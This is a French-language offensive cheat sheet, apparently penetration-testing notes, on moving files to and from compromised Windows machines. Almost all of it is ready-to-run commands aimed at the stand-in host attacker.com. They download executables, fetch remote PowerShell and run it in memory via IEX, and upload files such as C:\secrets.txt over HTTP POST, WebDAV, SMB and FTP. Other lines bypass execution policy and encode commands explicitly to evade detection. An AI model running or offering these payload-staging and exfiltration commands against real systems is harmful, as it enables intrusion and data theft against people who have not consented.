
# Transferts de Fichiers dans les Environnements Windows

## PowerShell - Téléchargement

PowerShell offre plusieurs méthodes pour télécharger des fichiers, fonctionnant même dans des versions restrictives.

### System.Net.WebClient

```powershell
# Téléchargement de fichier
(New-Object Net.WebClient).DownloadFile('http://attacker.com/file.exe', 'C:\Users\Public\file.exe')

# Téléchargement asynchrone
(New-Object Net.WebClient).DownloadFileAsync('http://attacker.com/file.exe', 'C:\Users\Public\file.exe')

# Contenu en mémoire
$content = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Invoke-WebRequest (PowerShell 3.0+)

```powershell
# Téléchargement standard
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "C:\Users\Public\file.exe"

# Avec contournement d'IE
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "C:\Users\Public\file.exe" -UseBasicParsing
```

### Contournement des Restrictions

```powershell
# Contournement de la politique d'exécution
PowerShell -ExecutionPolicy Bypass -File script.ps1

# Encodage de commande pour contourner la détection
powershell -enc [BASE64_ENCODED_COMMAND]
```

## PowerShell - Envoi de Fichiers

### Envoi vers un serveur Web

```powershell
# Encodage et envoi via POST
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\file.exe' -Encoding Byte))
Invoke-WebRequest -Uri "http://attacker.com/" -Method POST -Body $b64
```

### Utilisation d'un module d'envoi

```powershell
# Avec le module PSUpload
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PSUpload.ps1')
Invoke-FileUpload -Uri "http://attacker.com/upload" -File "C:\file.exe"
```

## SMB pour Transferts de Fichiers

### WebDAV (SMB sur HTTP)

```powershell
# Sur la machine attaquante (Linux)
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

# Sur la machine Windows cible
dir \\attacker.com\DavWWWRoot\
copy C:\secrets.txt \\attacker.com\DavWWWRoot\
```

### Montage de Partages SMB

```powershell
# Création d'un partage SMB authentifié
net use Z: \\attacker.com\share /user:username password

# Copie de fichiers
copy C:\secrets.txt Z:\
```

## FTP pour Transferts de Fichiers

```powershell
# Utilisateur .NET WebClient
(New-Object Net.WebClient).UploadFile('ftp://attacker.com/upload', 'C:\secrets.txt')

# Avec la commande FTP et un script
echo open attacker.com > ftpcmd.txt
echo USER anonymous >> ftpcmd.txt
echo binary >> ftpcmd.txt
echo PUT C:\secrets.txt >> ftpcmd.txt
echo bye >> ftpcmd.txt
ftp -s:ftpcmd.txt
```

## Transferts via RDP

```
# Montage de dossier local dans RDP (depuis Linux)
xfreerdp /v:target.com /u:username /p:password /drive:share,/path/to/local/folder

# Accès depuis Windows
\\tsclient\share\
```

## Points Importants

- Vérifier d'abord les méthodes les plus simples (PowerShell)
- En cas de restrictions, utiliser des alternatives comme SMB ou FTP
- Considérer l'utilisation de RDP pour les transferts simples si déjà connecté
- Faire attention aux erreurs comme Internet Explorer non configuré dans PowerShell
- Toujours vérifier l'intégrité des fichiers après le transfert